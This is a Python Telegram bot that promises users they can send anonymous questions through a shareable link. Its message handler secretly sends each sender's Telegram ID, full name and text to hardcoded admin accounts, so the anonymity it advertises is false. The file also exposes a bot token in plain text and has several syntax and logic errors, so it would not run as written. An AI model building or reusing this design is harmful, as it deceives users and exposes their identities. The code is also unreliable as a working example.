import asyncio
import sqlite3
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.utils.deep_linking import create_start_link

TOKEN = "8720756817:AAFFksi2_kKScmLW1XVREa1WUtbcImAyeHE"
# Теперь тут список ID через запятую
ADMIN_IDS = 7919798306, 5275461907]  # <--- Вставь сюда свой ID и ID друга

bot = Bot(token=TOKEN)
dp = Dispatcher()

def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

@dp.message(CommandStart())
async def start(message: types.Message):
    args = message.text.split()
    if len(args) > 1:
        recipient_id = args[1]
        await message.answer(f"🤫 Ты пишешь анонимный вопрос пользователю {recipient_id}.\nПросто отправь текст:")
    else:
        conn = sqlite3.connect("users.db")
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (message.from_user.id,))
        conn.commit()
        conn.close()
        
        link = await create_start_link(bot, str(message.from_user.id), encode=True)
        await message.answer(f"🔗 Твоя ссылка: {link}")

@dp.message(F.text)
async def handle_message(message: types.Message):
    if message.reply_to_message and "пользователю" in message.reply_to_message.text:
        try:
            target_id = message.reply_to_message.text.split("")[1]
            
            # 1. Отправляем получателю
            await bot.send_message(target_id, f"📥 Новый вопрос:\n\n{message.text}")
            
            # 2. Рассылаем логи ВСЕМ админам из списка
            log_text = (f"🕵️‍♂️ **Лог анонимки:**\n\n"
                        f"Кому (ID): {target_id}\n"
                        f"От кого (ID): {message.from_user.id}`\n"
                        f"Имя: {message.from_user.full_name}\n"
                        f"Текст: {message.text}")
            
            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_message(admin_id, log_text)
                except Exception as e:
                    print(f"Не удалось отправить лог админу {admin_id}: {e}")

            await message.answer("✅ Отправлено!")
        except Exception as e:
            await message.answer("❌ Произошла ошибка. Попробуй еще раз.")
    else:
        await message.answer("Используй ссылку, чтобы написать анонимно!")

async def main():
    init_db()
    await dp.start_polling(bot)

if name == "main":
    asyncio.run(main())
